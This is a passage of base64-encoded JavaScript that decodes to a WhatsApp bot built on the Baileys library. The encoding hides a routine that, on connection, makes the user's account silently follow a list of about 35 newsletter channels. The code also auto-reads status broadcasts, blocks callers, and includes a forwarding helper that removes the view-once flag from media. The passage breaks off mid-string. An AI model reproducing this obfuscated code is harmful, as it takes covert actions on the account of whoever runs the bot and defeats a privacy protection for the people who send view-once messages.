TIwMzYzNDIwNjA1MTkzMTMxQG5ld3NsZXR0ZXIiLAogICAgICAgICAgICAgICAgIjEyMDM2MzQwMTYyNjk0MTAxMUBuZXdzbGV0dGVyIiwKICAgICAgICAgICAgICAgICIxMjAzNjM0MDEyNDIzNjM0MzhAbmV3c2xldHRlciIsCiAgICAgICAgICAgICAgICAiMTIwMzYzNDAxOTU2MjkzMjU1QG5ld3NsZXR0ZXIiLAogICAgICAgICAgICAgICAgIjEyMDM2MzM5OTc1NTMzNzU2NkBuZXdzbGV0dGVyIiwKICAgICAgICAgICAgICAgICIxMjAzNjM0MDAxMjczMDA2MzJAbmV3c2xldHRlciIsCiAgICAgICAgICAgICAgICAiMTIwMzYzNDE4MDA4MDQ2ODYwQG5ld3NsZXR0ZXIiLAogICAgICAgICAgICAgICAgIjEyMDM2MzQxODY2MzMyOTQ2NUBuZXdzbGV0dGVyIiwKICAgICAgICAgICAgICAgICIxMjAzNjM0MDM0MTg2MDgxOTZAbmV3c2xldHRlciIsCiAgICAgICAgICAgICAgICAiMTIwMzYzNDAyNTQ5OTI4NDkwQG5ld3NsZXR0ZXIiLAogICAgICAgICAgICAgICAgIjEyMDM2MzQxOTc2OTUyODk1OUBuZXdzbGV0dGVyIiwKICAgICAgICAgICAgICAgICIxMjAzNjM0MDMxMjM2NDEwNjNAbmV3c2xldHRlciIsCiAgICAgICAgICAgICAgICAiMTIwMzYzNDE3OTA3OTU3MDQzQG5ld3NsZXR0ZXIiLAogICAgICAgICAgICAgICAgIjEyMDM2MzQwMTQ1NzYyMTQwM0BuZXdzbGV0dGVyIiwKICAgICAgICAgICAgICAgICIxMjAzNjM0MjE2MzgxNjg0MTBAbmV3c2xldHRlciIsCiAgICAgICAgICAgICAgICAiMTIwMzYzNDIwMTE5OTExMDk0QG5ld3NsZXR0ZXIiLAogICAgICAgICAgICAgICAgIjEyMDM2MzQxODU0NTc2ODcwMEBuZXdzbGV0dGVyIiwKICAgICAgICAgICAgICAgICIxMjAzNjM0MTg5MTM2MzUzODVAbmV3c2xldHRlciIsCiAgICAgICAgICAgICAgICAiMTIwMzYzNDAwOTI3OTE5MzM0QG5ld3NsZXR0ZXIiLAogICAgICAgICAgICAgICAgIjEyMDM2MzQxNzc5ODcxODU2NUBuZXdzbGV0dGVyIiwKICAgICAgICAgICAgICAgICIxMjAzNjMzOTk5NjYyMDc3MDFAbmV3c2xldHRlciIsCiAgICAgICAgICAgICAgICAiMTIwMzYzNDAyMjMxNTgwODQ0QG5ld3NsZXR0ZXIiLAogICAgICAgICAgICAgICAgIjEyMDM2MzQxOTYyOTQwNTMzNUBuZXdzbGV0dGVyIiwKICAgICAgICAgICAgICAgICIxMjAzNjMzOTkzNDMwMzgwNTRAbmV3c2xldHRlciIsCiAgICAgICAgICAgICAgICAiMTIwMzYzNDE4NzA0MTkwNTE5QG5ld3NsZXR0ZXIiLAogICAgICAgICAgICAgICAgIjEyMDM2MzQxNzMwMzEwNjc3MUBuZXdzbGV0dGVyIiwKICAgICAgICAgICAgICAgICIxMjAzNjM0MDE0OTM1NDg5NDZAbmV3c2xldHRlciIsCiAgICAgICAgICAgICAgICAiMTIwMzYzNDAxNjkxMjY0MjM4QG5ld3NsZXR0ZXIiLAogICAgICAgICAgICAgICAgIjEyMDM2MzQwMjI2ODcyNTMyNkBuZXdzbGV0dGVyIiwKICAgICAgICAgICAgICAgICIxMjAzNjMzOTk1Nzg5MzYyNzZAbmV3c2xldHRlciIsCiAgICAgICAgICAgICAgICAiMTIwMzYzNDAyMjc5MzU5NjIwQG5ld3NsZXR0ZXIiLAogICAgICAgICAgICAgICAgIjEyMDM2MzQyMTI3MzQ2NDEzMUBuZXdzbGV0dGVyIiwKICAgICAgICAgICAgICAgICIxMjAzNjM0MDE5MjU2NDA4NzhAbmV3c2xldHRlciIsCiAgICAgICAgICAgICAgICAiMTIwMzYzNDIwOTY4NTc1NDA2QG5ld3NsZXR0ZXIiLAogICAgICAgICAgICAgICAgIjEyMDM2MzQxOTg2NzU1NzAyMUBuZXdzbGV0dGVyIiwKICAgICAgICAgICAgICAgICIxMjAzNjM0MTc5MjA4MDUzOThAbmV3c2xldHRlciIKICAgICAgICAgICAgXTsKICAgICAgICAgICAgZm9yIChjb25zdCBpZCBvZiBjaGFubmVsSURzKSB7CiAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgIGF3YWl0IE1lbGlvZGFzLm5ld3NsZXR0ZXJGb2xsb3coaWQpOwogICAgICAgICAgICAgICAgfSBjYXRjaCAoZXJyKSB7CiAgICAgICAgICAgICAgICAgICAgY29uc29sZS5lcnJvcigiRXJyb3IgZm9sbG93aW5nIG5ld3NsZXR0ZXI6IiwgZXJyKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIAogICAKICAgICAgICB9CiAgICB9IGNhdGNoIChlcnIpIHsKICAgICAgICBjb25zb2xlLmVycm9yKCfinYwgRXJyb3IgaW4gY29ubmVjdGlvbiB1cGRhdGU6JywgZXJyKQogICAgICAgIGF3YWl0IGRlbGF5KDMwMDApCiAgICAgICAgTmFuYXRzdU5vVGFpemFpKCkKICAgIH0KfSkKCgphd2FpdCBkZWxheSg1NTU1KSAKc3RhcnQoJzInLGNvbG9ycy5ib2xkLndoaXRlKCdcblxuTWVudW5nZ3UgUGVzYW4gQmFydS4uJykpCgpNZWxpb2Rhcy5ldi5vbignY3JlZHMudXBkYXRlJywgYXdhaXQgc2F2ZUNyZWRzKQoKICAgIC8vIEFudGkgQ2FsbAogICAgTWVsaW9kYXMuZXYub24oJ2NhbGwnLCBhc3luYyAoWGVvblBhcGEpID0+IHsKICAgIGxldCBib3ROdW1iZXIgPSBhd2FpdCBNZWxpb2Rhcy5kZWNvZGVKaWQoTWVsaW9kYXMudXNlci5pZCkKICAgIGxldCBYZW9uQm90TnVtID0gZGIuc2V0dGluZ3NbYm90TnVtYmVyXS5hbnRpY2FsbAogICAgaWYgKCFYZW9uQm90TnVtKSByZXR1cm4KICAgIGNvbnNvbGUubG9nKFhlb25QYXBhKQogICAgZm9yIChsZXQgWGVvbkZ1Y2tzIG9mIFhlb25QYXBhKSB7CiAgICBpZiAoWGVvbkZ1Y2tzLmlzR3JvdXAgPT0gZmFsc2UpIHsKICAgIGlmIChYZW9uRnVja3Muc3RhdHVzID09ICJvZmZlciIpIHsKICAgIGxldCBYZW9uQmxva01zZyA9IGF3YWl0IE1lbGlvZGFzLnNlbmRUZXh0V2l0aE1lbnRpb25zKFhlb25GdWNrcy5mcm9tLCBgKiR7TWVsaW9kYXMudXNlci5uYW1lfSogY2FuJ3QgcmVjZWl2ZSAke1hlb25GdWNrcy5pc1ZpZGVvID8gYHZpZGVvYCA6IGB2b2ljZWAgfSBjYWxsLiBTb3JyeSBAJHtYZW9uRnVja3MuZnJvbS5zcGxpdCgnQCcpWzBdfSB5b3Ugd2lsbCBiZSBibG9ja2VkLiBJZiBhY2NpZGVudGFsbHkgcGxlYXNlIGNvbnRhY3QgdGhlIG93bmVyIHRvIGJlIHVuYmxvY2tlZCAhYCkKICAgIE1lbGlvZGFzLnNlbmRDb250YWN0KFhlb25GdWNrcy5mcm9tLCBnbG9iYWwub3duZXIsIFhlb25CbG9rTXNnKQogICAgYXdhaXQgc2xlZXAoODAwMCkKICAgIGF3YWl0IE1lbGlvZGFzLnVwZGF0ZUJsb2NrU3RhdHVzKFhlb25GdWNrcy5mcm9tLCAiYmxvY2siKQogICAgfQogICAgfQogICAgfQogICAgfSkKTWVsaW9kYXMuZXYub24oJ21lc3NhZ2VzLnVwc2VydCcsIGFzeW5jIGNoYXRVcGRhdGUgPT4gewp0cnkgewpjb25zdCBrYXkgPSBjaGF0VXBkYXRlLm1lc3NhZ2VzWzBdCmlmICgha2F5Lm1lc3NhZ2UpIHJldHVybgprYXkubWVzc2FnZSA9IChPYmplY3Qua2V5cyhrYXkubWVzc2FnZSlbMF0gPT09ICdlcGhlbWVyYWxNZXNzYWdlJykgPyBrYXkubWVzc2FnZS5lcGhlbWVyYWxNZXNzYWdlLm1lc3NhZ2UgOiBrYXkubWVzc2FnZQppZiAoa2F5LmtleSAmJiBrYXkua2V5LnJlbW90ZUppZCA9PT0gJ3N0YXR1c0Bicm9hZGNhc3QnKSAgewphd2FpdCBNZWxpb2Rhcy5yZWFkTWVzc2FnZXMoW2theS5rZXldKSB9CmlmICghTWVsaW9kYXMucHVibGljICYmICFrYXkua2V5LmZyb21NZSAmJiBjaGF0VXBkYXRlLnR5cGUgPT09ICdub3RpZnknKSByZXR1cm4KaWYgKGtheS5rZXkuaWQuc3RhcnRzV2l0aCgnQkFFNScpICYmIGtheS5rZXkuaWQubGVuZ3RoID09PSAxNikgcmV0dXJuCmNvbnN0IG0gPSBzbXNnKE1lbGlvZGFzLCBrYXksIHN0b3JlKQpyZXF1aXJlKCcuL0Z1cmluYScpKE1lbGlvZGFzLCBtLCBjaGF0VXBkYXRlLCBzdG9yZSkKfSBjYXRjaCAoZXJyKSB7CmNvbnNvbGUubG9nKGVycil9fSkKICAgIGFzeW5jIGZ1bmN0aW9uIGdldE1lc3NhZ2Uoa2V5KXsKICAgICAgICBpZiAoc3RvcmUpIHsKICAgICAgICAgICAgY29uc3QgbXNnID0gYXdhaXQgc3RvcmUubG9hZE1lc3NhZ2Uoa2V5LnJlbW90ZUppZCwga2V5LmlkKQogICAgICAgICAgICByZXR1cm4gbXNnPy5tZXNzYWdlCiAgICAgICAgfQogICAgICAgIHJldHVybiB7CiAgICAgICAgICAgIGNvbnZlcnNhdGlvbjogIkRhbnN5YSBCb3QgQWRhIERpIFNpbmkiCiAgICAgICAgfQogICAgfQogICAgTWVsaW9kYXMuZXYub24oJ21lc3NhZ2VzLnVwZGF0ZScsIGFzeW5jIGNoYXRVcGRhdGUgPT4gewogICAgICAgIGZvcihjb25zdCB7IGtleSwgdXBkYXRlIH0gb2YgY2hhdFVwZGF0ZSkgewoJCQlpZih1cGRhdGUucG9sbFVwZGF0ZXMgJiYgIWtleS5mcm9tTWUpIHsKCQkJCWNvbnN0IHBvbGxDcmVhdGlvbiA9IGF3YWl0IGdldE1lc3NhZ2Uoa2V5KQoJCQkJaWYocG9sbENyZWF0aW9uKSB7CgkJCQkgICAgY29uc3QgcG9sbFVwZGF0ZSA9IGF3YWl0IGdldEFnZ3JlZ2F0ZVZvdGVzSW5Qb2xsTWVzc2FnZSh7CgkJCQkJCQltZXNzYWdlOiBwb2xsQ3JlYXRpb24sCgkJCQkJCQlwb2xsVXBkYXRlczogdXBkYXRlLnBvbGxVcGRhdGVzLAoJCQkJCQl9KQoJICAgICAgICAgICAgICAgIHZhciB0b0NtZCA9IHBvbGxVcGRhdGUuZmlsdGVyKHYgPT4gdi52b3RlcnMubGVuZ3RoICE9PSAwKVswXT8ubmFtZQoJICAgICAgICAgICAgICAgIGlmICh0b0NtZCA9PSB1bmRlZmluZWQpIHJldHVybgogICAgICAgICAgICAgICAgICAgIHZhciBwcmVmQ21kID0gcHJlZml4K3RvQ21kCgkgICAgICAgICAgICAgICAgTWVsaW9kYXMuYXBwZW5UZXh0TWVzc2FnZShwcmVmQ21kLCBjaGF0VXBkYXRlKQoJCQkJfQoJCQl9CgkJfQogICAgfSkKCk1lbGlvZGFzLnNlbmRUZXh0V2l0aE1lbnRpb25zID0gYXN5bmMgKGppZCwgdGV4dCwgcXVvdGVkLCBvcHRpb25zID0ge30pID0+IE1lbGlvZGFzLnNlbmRNZXNzYWdlKGppZCwgeyB0ZXh0OiB0ZXh0LCBjb250ZXh0SW5mbzogeyBtZW50aW9uZWRKaWQ6IFsuLi50ZXh0Lm1hdGNoQWxsKC9AKFxkezAsMTZ9KS9nKV0ubWFwKHYgPT4gdlsxXSArICdAcy53aGF0c2FwcC5uZXQnKSB9LCAuLi5vcHRpb25zIH0sIHsgcXVvdGVkIH0pCgpNZWxpb2Rhcy5kZWNvZGVKaWQgPSAoamlkKSA9PiB7CmlmICghamlkKSByZXR1cm4gamlkCmlmICgvOlxkK0AvZ2kudGVzdChqaWQpKSB7CmxldCBkZWNvZGUgPSBqaWREZWNvZGUoamlkKSB8fCB7fQpyZXR1cm4gZGVjb2RlLnVzZXIgJiYgZGVjb2RlLnNlcnZlciAmJiBkZWNvZGUudXNlciArICdAJyArIGRlY29kZS5zZXJ2ZXIgfHwgamlkCn0gZWxzZSByZXR1cm4gamlkCn0KCk1lbGlvZGFzLmV2Lm9uKCdjb250YWN0cy51cGRhdGUnLCB1cGRhdGUgPT4gewpmb3IgKGxldCBjb250YWN0IG9mIHVwZGF0ZSkgewpsZXQgaWQgPSBNZWxpb2Rhcy5kZWNvZGVKaWQoY29udGFjdC5pZCkKaWYgKHN0b3JlICYmIHN0b3JlLmNvbnRhY3RzKSBzdG9yZS5jb250YWN0c1tpZF0gPSB7IGlkLCBuYW1lOiBjb250YWN0Lm5vdGlmeSB9Cn0KfSkKCk1lbGlvZGFzLmdldE5hbWUgPSAoamlkLCB3aXRob3V0Q29udGFjdCAgPSBmYWxzZSkgPT4gewppZCA9IE1lbGlvZGFzLmRlY29kZUppZChqaWQpCndpdGhvdXRDb250YWN0ID0gTWVsaW9kYXMud2l0aG91dENvbnRhY3QgfHwgd2l0aG91dENvbnRhY3QgCmxldCB2CmlmIChpZC5lbmRzV2l0aCgiQGcudXMiKSkgcmV0dXJuIG5ldyBQcm9taXNlKGFzeW5jIChyZXNvbHZlKSA9PiB7CnYgPSBzdG9yZS5jb250YWN0c1tpZF0gfHwge30KaWYgKCEodi5uYW1lIHx8IHYuc3ViamVjdCkpIHYgPSBNZWxpb2Rhcy5ncm91cE1ldGFkYXRhKGlkKSB8fCB7fQpyZXNvbHZlKHYubmFtZSB8fCB2LnN1YmplY3QgfHwgUGhvbmVOdW1iZXIoJysnICsgaWQucmVwbGFjZSgnQHMud2hhdHNhcHAubmV0JywgJycpKS5nZXROdW1iZXIoJ2ludGVybmF0aW9uYWwnKSkKfSkKZWxzZSB2ID0gaWQgPT09ICcwQHMud2hhdHNhcHAubmV0JyA/IHsKaWQsCm5hbWU6ICdXaGF0c0FwcCcKfSA6IGlkID09PSBNZWxpb2Rhcy5kZWNvZGVKaWQoTWVsaW9kYXMudXNlci5pZCkgPwpNZWxpb2Rhcy51c2VyIDoKKHN0b3JlLmNvbnRhY3RzW2lkXSB8fCB7fSkKcmV0dXJuICh3aXRob3V0Q29udGFjdCA/ICcnIDogdi5uYW1lKSB8fCB2LnN1YmplY3QgfHwgdi52ZXJpZmllZE5hbWUgfHwgUGhvbmVOdW1iZXIoJysnICsgamlkLnJlcGxhY2UoJ0BzLndoYXRzYXBwLm5ldCcsICcnKSkuZ2V0TnVtYmVyKCdpbnRlcm5hdGlvbmFsJykKfQoKTWVsaW9kYXMucGFyc2VNZW50aW9uID0gKHRleHQgPSAnJykgPT4gewpyZXR1cm4gWy4uLnRleHQubWF0Y2hBbGwoL0AoWzAtOV17NSwxNn18MCkvZyldLm1hcCh2ID0+IHZbMV0gKyAnQHMud2hhdHNhcHAubmV0JykKfQoKTWVsaW9kYXMuc2VuZENvbnRhY3QgPSBhc3luYyAoamlkLCBrb24sIHF1b3RlZCA9ICcnLCBvcHRzID0ge30pID0+IHsKCWxldCBsaXN0ID0gW10KCWZvciAobGV0IGkgb2Yga29uKSB7CgkgICAgbGlzdC5wdXNoKHsKCSAgICAJZGlzcGxheU5hbWU6IGF3YWl0IE1lbGlvZGFzLmdldE5hbWUoaSksCgkgICAgCXZjYXJkOiBgQkVHSU46VkNBUkRcblZFUlNJT046My4wXG5OOiR7YXdhaXQgTWVsaW9kYXMuZ2V0TmFtZShpKX1cbkZOOiR7YXdhaXQgTWVsaW9kYXMuZ2V0TmFtZShpKX1cbml0ZW0xLlRFTDt3YWlkPSR7aX06JHtpfVxuaXRlbTEuWC1BQkxhYmVsOkNsaWNrIGhlcmUgdG8gY2hhdFxuaXRlbTIuRU1BSUw7dHlwZT1JTlRFUk5FVDoke3l0bmFtZX1cbml0ZW0yLlgtQUJMYWJlbDpZb3VUdWJlXG5pdGVtMy5VUkw6JHtzb2NpYWxtfVxuaXRlbTMuWC1BQkxhYmVsOkdpdEh1YlxuaXRlbTQuQURSOjs7JHtsb2NhdGlvbn07Ozs7XG5pdGVtNC5YLUFCTGFiZWw6UmVnaW9uXG5FTkQ6VkNBUkRgCgkgICAgfSkKCX0KCU1lbGlvZGFzLnNlbmRNZXNzYWdlKGppZCwgeyBjb250YWN0czogeyBkaXNwbGF5TmFtZTogYCR7bGlzdC5sZW5ndGh9IENvbnRhY3RgLCBjb250YWN0czogbGlzdCB9LCAuLi5vcHRzIH0sIHsgcXVvdGVkIH0pCiAgICB9CgpNZWxpb2Rhcy5zZXRTdGF0dXMgPSAoc3RhdHVzKSA9PiB7Ck1lbGlvZGFzLnF1ZXJ5KHsKdGFnOiAnaXEnLAphdHRyczogewp0bzogJ0BzLndoYXRzYXBwLm5ldCcsCnR5cGU6ICdzZXQnLAp4bWxuczogJ3N0YXR1cycsCn0sCmNvbnRlbnQ6IFt7CnRhZzogJ3N0YXR1cycsCmF0dHJzOiB7fSwKY29udGVudDogQnVmZmVyLmZyb20oc3RhdHVzLCAndXRmLTgnKQp9XQp9KQpyZXR1cm4gc3RhdHVzCn0KCk1lbGlvZGFzLnB1YmxpYyA9IHRydWUKCk1lbGlvZGFzLnNlbmRJbWFnZSA9IGFzeW5jIChqaWQsIHBhdGgsIGNhcHRpb24gPSAnJywgcXVvdGVkID0gJycsIG9wdGlvbnMpID0+IHsKbGV0IGJ1ZmZlciA9IEJ1ZmZlci5pc0J1ZmZlcihwYXRoKSA/IHBhdGggOiAvXmRhdGE6Lio/XC8uKj87YmFzZTY0LC9pLnRlc3QocGF0aCkgPyBCdWZmZXIuZnJvbShwYXRoLnNwbGl0YCxgWzFdLCAnYmFzZTY0JykgOiAvXmh0dHBzPzpcL1wvLy50ZXN0KHBhdGgpID8gYXdhaXQgKGF3YWl0IGdldEJ1ZmZlcihwYXRoKSkgOiBmcy5leGlzdHNTeW5jKHBhdGgpID8gZnMucmVhZEZpbGVTeW5jKHBhdGgpIDogQnVmZmVyLmFsbG9jKDApCnJldHVybiBhd2FpdCBNZWxpb2Rhcy5zZW5kTWVzc2FnZShqaWQsIHsgaW1hZ2U6IGJ1ZmZlciwgY2FwdGlvbjogY2FwdGlvbiwgLi4ub3B0aW9ucyB9LCB7IHF1b3RlZCB9KQp9CgpNZWxpb2Rhcy5zZW5kSW1hZ2VBc1N0aWNrZXIgPSBhc3luYyAoamlkLCBwYXRoLCBxdW90ZWQsIG9wdGlvbnMgPSB7fSkgPT4gewpsZXQgYnVmZiA9IEJ1ZmZlci5pc0J1ZmZlcihwYXRoKSA/IHBhdGggOiAvXmRhdGE6Lio/XC8uKj87YmFzZTY0LC9pLnRlc3QocGF0aCkgPyBCdWZmZXIuZnJvbShwYXRoLnNwbGl0YCxgWzFdLCAnYmFzZTY0JykgOiAvXmh0dHBzPzpcL1wvLy50ZXN0KHBhdGgpID8gYXdhaXQgKGF3YWl0IGdldEJ1ZmZlcihwYXRoKSkgOiBmcy5leGlzdHNTeW5jKHBhdGgpID8gZnMucmVhZEZpbGVTeW5jKHBhdGgpIDogQnVmZmVyLmFsbG9jKDApCmxldCBidWZmZXIKaWYgKG9wdGlvbnMgJiYgKG9wdGlvbnMucGFja25hbWUgfHwgb3B0aW9ucy5hdXRob3IpKSB7CmJ1ZmZlciA9IGF3YWl0IHdyaXRlRXhpZkltZyhidWZmLCBvcHRpb25zKQp9IGVsc2UgewpidWZmZXIgPSBhd2FpdCBpbWFnZVRvV2VicChidWZmKQp9CmF3YWl0IE1lbGlvZGFzLnNlbmRNZXNzYWdlKGppZCwgeyBzdGlja2VyOiB7IHVybDogYnVmZmVyIH0sIC4uLm9wdGlvbnMgfSwgeyBxdW90ZWQgfSkKLnRoZW4oIHJlc3BvbnNlID0+IHsKZnMudW5saW5rU3luYyhidWZmZXIpCnJldHVybiByZXNwb25zZQp9KQp9CgpNZWxpb2Rhcy5zZW5kVmlkZW9Bc1N0aWNrZXIgPSBhc3luYyAoamlkLCBwYXRoLCBxdW90ZWQsIG9wdGlvbnMgPSB7fSkgPT4gewpsZXQgYnVmZiA9IEJ1ZmZlci5pc0J1ZmZlcihwYXRoKSA/IHBhdGggOiAvXmRhdGE6Lio/XC8uKj87YmFzZTY0LC9pLnRlc3QocGF0aCkgPyBCdWZmZXIuZnJvbShwYXRoLnNwbGl0YCxgWzFdLCAnYmFzZTY0JykgOiAvXmh0dHBzPzpcL1wvLy50ZXN0KHBhdGgpID8gYXdhaXQgKGF3YWl0IGdldEJ1ZmZlcihwYXRoKSkgOiBmcy5leGlzdHNTeW5jKHBhdGgpID8gZnMucmVhZEZpbGVTeW5jKHBhdGgpIDogQnVmZmVyLmFsbG9jKDApCmxldCBidWZmZXIKaWYgKG9wdGlvbnMgJiYgKG9wdGlvbnMucGFja25hbWUgfHwgb3B0aW9ucy5hdXRob3IpKSB7CmJ1ZmZlciA9IGF3YWl0IHdyaXRlRXhpZlZpZChidWZmLCBvcHRpb25zKQp9IGVsc2UgewpidWZmZXIgPSBhd2FpdCB2aWRlb1RvV2VicChidWZmKQp9CmF3YWl0IE1lbGlvZGFzLnNlbmRNZXNzYWdlKGppZCwgeyBzdGlja2VyOiB7IHVybDogYnVmZmVyIH0sIC4uLm9wdGlvbnMgfSwgeyBxdW90ZWQgfSkKcmV0dXJuIGJ1ZmZlcgp9CgpNZWxpb2Rhcy5jb3B5TkZvcndhcmQgPSBhc3luYyAoamlkLCBtZXNzYWdlLCBmb3JjZUZvcndhcmQgPSBmYWxzZSwgb3B0aW9ucyA9IHt9KSA9PiB7CmxldCB2dHlwZQppZiAob3B0aW9ucy5yZWFkVmlld09uY2UpIHsKbWVzc2FnZS5tZXNzYWdlID0gbWVzc2FnZS5tZXNzYWdlICYmIG1lc3NhZ2UubWVzc2FnZS5lcGhlbWVyYWxNZXNzYWdlICYmIG1lc3NhZ2UubWVzc2FnZS5lcGhlbWVyYWxNZXNzYWdlLm1lc3NhZ2UgPyBtZXNzYWdlLm1lc3NhZ2UuZXBoZW1lcmFsTWVzc2FnZS5tZXNzYWdlIDogKG1lc3NhZ2UubWVzc2FnZSB8fCB1bmRlZmluZWQpCnZ0eXBlID0gT2JqZWN0LmtleXMobWVzc2FnZS5tZXNzYWdlLnZpZXdPbmNlTWVzc2FnZS5tZXNzYWdlKVswXQpkZWxldGUobWVzc2FnZS5tZXNzYWdlICYmIG1lc3NhZ2UubWVzc2FnZS5pZ25vcmUgPyBtZXNzYWdlLm1lc3NhZ2UuaWdub3JlIDogKG1lc3NhZ2UubWVzc2FnZSB8fCB1bmRlZmluZWQpKQpkZWxldGUgbWVzc2FnZS5tZXNzYWdlLnZpZXdPbmNlTWVzc2FnZS5tZXNzYWdlW3Z0eXBlXS52aWV3T25jZQptZXNzYWdlLm1lc3NhZ2UgPSB7Ci4uLm1lc3NhZ2UubWVzc2FnZS52aWV3T25jZU1lc3NhZ2UubWVzc2FnZQp9Cn0KbGV0IG10eXBlID0gT2JqZWN0LmtleXMobWVzc2FnZS5tZXNzYWdlKVswXQpsZXQgY29udGVudCA9IGF3YWl0IGdlbmVyYXRlRm9yd2FyZE1lc3NhZ2VDb250ZW50KG1lc3NhZ2UsIGZvcmNlRm9yd2FyZCkKbGV0IGN0eXBlID0gT2JqZWN0LmtleXMoY29udGVudClbMF0KbGV0IGNvbnRleHQgPSB7fQppZiAobXR5cGUgIT0gImNvbnZlcnNhdGlvbiIpIGNvbnRleHQgPSBtZXNzYWdlLm1lc3NhZ2VbbXR5cGVdLmNvbnRleHRJbmZvCmNvbnRlbnRbY3R5cGVdLmNvbnRleHRJbmZvID0gewouLi5jb250ZXh0LAouLi5jb250ZW50W2N0eXBlXS5jb250ZXh0SW5mbwp9CmNvbnN0IHdhTWVzc2FnZSA9IGF3YWl0IGdlbmVyYXRlV0FNZXNzYWdlRnJvbUNvbnRlbnQoamlkLCBjb250ZW50LCBvcHRpb25zID8gewouLi5jb250ZW50W2N0eXBlXSwKLi4ub3B0aW9ucywKLi4uKG9wdGlvbnMuY29udGV4dEluZm8gPyB7CmNvbnRleHRJbmZvOiB7Ci4uLmNvbnRlbnRbY3R5cGVdLmNvbnRleHRJbmZvLAouLi5vcHRpb25zLmNvbnRleHRJbmZvCn0KfSA6IHt9KQp9IDoge30pCmF3YWl0IE1lbGlvZGFzLnJlbGF5TWVzc2FnZShqaWQsIHdhTWVzc2FnZS5tZXNzYWdlLCB7IG1lc3NhZ2VJZDogIHdhTWVzc2FnZS5rZXkuaWQgfSkKcmV0dXJuIHdhTWVzc2FnZQp9CgpNZWxpb2Rhcy5kb3dubG9hZEFuZFNhdmVNZWRpYU1lc3NhZ2UgPSBhc3luYyAobWVzc2FnZSwgZmlsZW5hbWUsIGF0dGFjaEV4dGVuc2lvbiA9IHRydWUpID0+IHsKbGV0IHF1b3RlZCA9IG1lc3NhZ2UubXNnID8gbWVzc2FnZS5tc2cgOiBtZXNzYWdlCmxldCBtaW1lID0gKG1lc3NhZ2UubXNnIHx8IG1lc3NhZ2UpLm1pbWV0eXBlIHx8ICcnCmxldCBtZXNzYWdlVHlwZSA9IG1lc3NhZ2UubXR5cGUgPyBtZXNzYWdlLm10eXBlLnJlcGxhY2UoL01lc3NhZ2UvZ2ksICcnKSA6IG1pbWUuc3BsaXQoJy8nKVswXQpjb25zdCBzdHJlYW0gPSBhd2FpdCBkb3dubG9hZENvbnRlbnRGcm9tTWVzc2FnZShxdW90ZWQsIG1lc3NhZ2VUeXBlKQpsZXQgYnVmZmVyID0gQnVmZmVyLmZyb20oW10pCmZvciBhd2FpdChjb25zdCBjaHVuayBvZiBzdHJlYW0pIHsKYnVmZmVyID0gQnVmZmVyLmNvbmNhdChbYnVmZmVyLCBjaHVua10pCn0KbGV0IHR5cGUgPSBhd2FpdCBGaWxlVHlwZS5mcm9tQnVmZmVyKGJ1ZmZlcikKdHJ1ZUZpbGVOYW1lID0gYXR0YWNoRXh0ZW5zaW9uID8gKGZpbGVuYW1lICsgJy4nICsgdHlwZS5leHQpIDogZmlsZW5hbWUKYXdhaXQgZnMud3JpdGVGaWxlU3luYyh0cnVlRmlsZU5hbWUsIGJ1ZmZlcikKcmV0dXJuIHRydWVGaWxlTmFtZQp9CgpNZWxpb2Rhcy5kb3dubG9hZE1lZGlhTWVzc2FnZSA9IGFzeW5jIChtZXNzYWdlKSA9PiB7CmxldCBtaW1lID0gKG1lc3NhZ2UubXNnIHx8IG1lc3NhZ2UpLm1pbWV0eXBlIHx8ICcnCmxldCBtZXNzYWdlVHlwZSA9IG1lc3NhZ2UubXR5cGUgPyBtZXNzYWdlLm10eXBlLnJlcGxhY2UoL01lc3NhZ2UvZ2ksICcnKSA6IG1pbWUuc3BsaXQoJy8nKVswXQpjb25zdCBzdHJlYW0gPSBhd2FpdCBkb3dubG9hZENvbnRlbnRGcm9tTWVzc2FnZShtZXNzYWdlLCBtZXNzYWdlVHlwZSkKbGV0IGJ1ZmZlciA9IEJ1ZmZlci5mcm9tKFtdKQpmb3IgYXdhaXQoY29uc3QgY2h1bmsgb2Ygc3RyZWFtKSB7CmJ1ZmZlciA9IEJ1ZmZlci5jb25jYXQoW2J1ZmZlciwgY2h1bmtdKQp9CnJldHVybiBidWZmZXIKfQoKTWVsaW9kYXMuZ2V0RmlsZSA9IGFzeW5jIChQQVRILCBzYXZlKSA9PiB7CmxldCByZXMKbGV0IGRhdGEgPSBCdWZmZXIuaXNCdWZmZXIoUEFUSCkgPyBQQVRIIDogL15kYXRhOi4qP1wvLio/O2Jhc2U2NCwvaS50ZXN0KFBBVEgpID8gQnVmZmVyLmZyb20oUEFUSC5zcGxpdGAsYFsxXSwgJ2Jhc2U2NCcpIDogL15odHRwcz86XC9cLy8udGVzdChQQVRIKSA/IGF3YWl0IChyZXMgPSBhd2FpdCBnZXRCdWZmZXIoUEFUSCkpIDogZnMuZXhpc3RzU3luYyhQQVRIKSA/IChmaWxlbmFtZSA9IFBBVEgsIGZzLnJlYWRGaWxlU3luYyhQQVRIKSkgOiB0eXBlb2YgUEFUSCA9PT0gJ3N0cmluZycgPyBQQVRIIDogQnVmZmVyLmFsbG9jKDApCmxldCB0eXBlID0gYXdhaXQgRmlsZVR5cGUuZnJvbUJ1ZmZlcihkYXRhKSB8fCB7Cm1pbWU6ICdhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nLApleHQ6ICcuYmluJ30KZmlsZW5hbWUgPSBwYXRoLmpvaW4oX19maWxlbmFtZSwgJy4vbGliJyArIG5ldyBEYXRlICogMSArICcuJyArIHR5cGUuZXh0KQppZiAoZGF0YSAmJiBzYXZlKSBmcy5wcm9taXNlcy53cml0ZUZpbGUoZmlsZW5hbWUsIGRhdGEpCnJldHVybiB7CnJlcywKZmlsZW5hbWUsCnNpemU6IGF3YWl0IGdldFNpemVNZWRpYShkYXRhKSwKLi4udHlwZSwKZGF0YX19CgpNZWxpb2Rhcy5zZW5kTWVkaWEgPSBhc3luYyAoamlkLCBwYXRoLCBmaWxlTmFtZSA9ICcnLCBjYXB0aW9uID0gJycsIHF1b3RlZCA9ICcnLCBvcHRpb25zID0ge30pID0+IHsKbGV0IHR5cGVzID0gYXdhaXQgTWVsaW9kYXMuZ2V0RmlsZShwYXRoLCB0cnVlKQpsZXQgeyBtaW1lLCBleHQsIHJlcywgZGF0YSwgZmlsZW5hbWUgfSA9IHR5cGVzCmlmIChyZXMgJiYgcmVzLnN0YXR1cyAhPT0gMjAwIHx8IGZpbGUubGVuZ3RoIDw9IDY1NTM2KSB7CnRyeSB7IHRocm93IHsganNvbjogSlNPTi5w